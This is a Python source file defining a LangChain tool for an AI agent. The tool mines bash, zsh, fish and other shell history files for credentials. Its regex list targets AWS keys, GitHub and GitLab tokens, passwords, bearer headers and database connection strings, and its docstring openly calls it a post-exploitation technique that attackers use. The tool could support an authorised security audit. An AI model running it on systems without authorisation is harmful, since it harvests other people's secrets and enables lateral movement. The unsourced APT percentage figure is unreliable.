"""Shell command history credential mining.

Shell history is one of the highest-yield credential sources in post-exploitation.
Developers routinely pass secrets as CLI arguments — API keys, database passwords,
tokens — which are saved verbatim. Approximately 60-70% of APTs include history
scraping as an early lateral movement step.

MITRE ATT&CK: T1552.003 (Unsecured Credentials: Bash History)
"""

from __future__ import annotations

import re

from langchain_core.tools import tool

from ..base import run_command

# Patterns that suggest credential-bearing command lines.
# Ordered from most specific (lowest false-positive) to broader.
_PATTERNS = [
    # AWS access keys
    r"AKIA[0-9A-Z]{16}",
    # GitHub / GitLab / Bitbucket tokens
    r"gh[pousr]_[A-Za-z0-9_]{36,}",
    r"glpat-[A-Za-z0-9\-_]{20,}",
    # Generic token/secret/password flags
    r"(?i)(?:--password|--passwd|-p\s)\s*\S+",
    r"(?i)(?:token|secret|api[_\-]?key|apikey)\s*[=:]\s*\S+",
    # Authorization headers
    r"(?i)(?:Authorization|Bearer|Basic)\s+[A-Za-z0-9+/=_\-]{8,}",
    # curl / wget with user:pass
    r"(?i)curl[^\n]*(?:-u|--user)\s+\S+:\S+",
    r"(?i)wget[^\n]*--(?:user|password)=\S+",
    # Database connection strings
    r"(?i)(?:postgresql|mysql|mongodb|redis|mssql)://[^\s@]+:[^\s@]+@",
    # npx / npm with tokens
    r"(?i)npm\s+(?:publish|adduser|login).*(?:token|//registry)",
    r"_authToken\s*=\s*\S+",
    # Heroku / Fly / Railway tokens
    r"(?i)(?:heroku|flyctl|fly|railway)\s+(?:auth|login|token)\s+\S+",
    # SSH password flags
    r"(?i)sshpass\s+-p\s+\S+",
    # Generic -password= flags
    r"(?i)(?:password|passwd)\s*=\s*\S{4,}",
]

_COMPILED = [re.compile(p) for p in _PATTERNS]


def _grep_history_file(path: str, label: str) -> str:
    """Read a history file and return lines matching credential patterns."""
    # Strip zsh extended history timestamps (": 1234567890:0;actual command")
    raw = run_command(
        f"cat {path} 2>/dev/null | sed 's/^: [0-9]*:[0-9]*;//'",
        timeout=10,
    )
    if not raw.stdout.strip():
        return f"=== {label} ===\n(not found or empty)"

    lines = raw.stdout.splitlines()
    matches: list[str] = []
    for line in lines:
        for pattern in _COMPILED:
            if pattern.search(line):
                matches.append(line.strip())
                break  # don't double-count a line matching multiple patterns

    if not matches:
        return f"=== {label} ({len(lines)} commands) ===\n(no credential patterns found)"

    # Show up to 50 matching lines — enough to be actionable without overwhelming
    shown = matches[:50]
    note = f"\n... ({len(matches) - 50} more matches truncated)" if len(matches) > 50 else ""
    return (
        f"=== {label} ({len(lines)} total commands, {len(matches)} credential-pattern matches) ===\n"
        + "\n".join(shown)
        + note
    )


@tool
def scan_shell_history() -> str:
    """Mine shell command history for credentials and secrets passed as CLI arguments.

    Searches bash, zsh, and fish history files for patterns indicating:
    - API keys and tokens passed as command arguments
    - Passwords in database connection strings (postgresql://, mysql://, etc.)
    - curl/wget commands with embedded credentials
    - AWS access keys, GitHub tokens, GitLab personal access tokens
    - Authorization headers used in curl/httpie calls
    - SSH password flags (sshpass -p)
    - npm/pip/package manager authentication tokens

    This is one of the first techniques attackers use post-compromise —
    approximately 60-70% of APT campaigns include shell history scraping.

    Returns:
        Matching command lines from each history file, or a count confirming no matches.
    """
    sections = []

    sections.append(_grep_history_file("~/.zsh_history", "Zsh history (~/.zsh_history)"))
    sections.append(_grep_history_file("~/.bash_history", "Bash history (~/.bash_history)"))

    fish_history = run_command("echo ~/.local/share/fish/fish_history").stdout.strip()
    sections.append(_grep_history_file(fish_history, "Fish history"))

    # Additional shells
    sections.append(_grep_history_file("~/.ash_history", "Ash history"))
    sections.append(_grep_history_file("~/.ksh_history", "Ksh history"))

    # Also check if history is being saved (HISTFILE env / shell config)
    histfile = run_command("echo $HISTFILE 2>/dev/null").output.strip()
    if histfile and histfile not in ("~/.zsh_history", "~/.bash_history"):
        sections.append(_grep_history_file(histfile, f"Custom HISTFILE ({histfile})"))

    # History size — a very large history increases exposure window
    hist_size = run_command(
        "wc -l ~/.zsh_history ~/.bash_history 2>/dev/null"
    )
    if hist_size.stdout.strip():
        sections.append(f"=== History file sizes ===\n{hist_size.stdout.strip()}")

    return "\n\n".join(s for s in sections if "(not found" not in s or "matches" in s)
